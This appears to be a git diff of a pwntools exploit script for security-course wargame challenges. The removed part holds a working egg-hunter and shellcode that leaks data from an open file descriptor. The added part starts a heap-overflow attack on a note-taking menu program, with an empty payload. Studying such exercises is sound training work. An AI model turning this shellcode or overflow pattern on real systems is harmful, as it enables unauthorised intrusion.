@@ -6,11 +6,11 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 context.update(arch='i386')
-exe = './find-me' #Change this
+exe = './notezpz2' #Change this
 
 PROGNAME = exe
 REMOTE = "comp6447.wtf" #Change this
-REMOTEPORT = 24973 #Change this
+REMOTEPORT = 6691 #Change this
 global p
 global e
 global global_timeout
@@ -47,54 +47,35 @@ else:
 #===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
-# The first four instructions are equivalent to 0x4f904790.
-# This is our egg.
 
-# Egg hunter
-small_assembly = """
-_start:
-mov edx, 0x4f904790
-loop:
-inc eax
-cmp dword ptr [eax], edx
-jne loop
-jmp eax
-"""
+def create():
+    p.recvuntil(b"): ", drop=True)
+    p.sendline(b'c')
 
-# Egg + Shellcode
-large_assembly = """
-nop
-inc edi
-nop
-dec edi
+def delete(id):
+    p.recvuntil(b"): ", drop=True)
+    p.sendline(b'd')
+    p.recvuntil(b"id: ", drop=True)
+    p.sendline(id)
 
-xor ecx, ecx
-mul ecx
+def set(id, input):
+    p.recvuntil(b"): ", drop=True)
+    p.sendline(b's')
+    p.recvuntil(b"id: ", drop=True)
+    p.sendline(id)
+    p.recvuntil(b"question: ", drop=True)
+    p.sendline(input)
 
-sub esp, 400
-mov ecx, esp
-mov ebx, 1000
-mov eax, 0x3
-mov edx, 0xFF
-int 0x80
+def ask(id):
+    p.recvuntil(b"): ", drop=True)
+    p.sendline(b'a')
+    p.recvuntil(b"id: ", drop=True)
+    p.sendline(id)
 
-mov eax, 0x4
-mov ebx, 0x1
-int 0x80
-
-mov eax, 0x1
-int 0x80
-"""
-
-
-
-small_asm = asm(small_assembly)
-large_asm = asm(large_assembly)
-
-p.recvuntil(b'smallbuf shellcode', drop=True)
-p.sendline(small_asm)
-p.recvuntil(b'bigbuf shellcode:', drop=True)
-p.sendline(large_asm)
-
+payload = b''
+create()
+create()
+set(b'0',b'a'*40 + payload)
+ask(b'0')
 p.interactive()
 
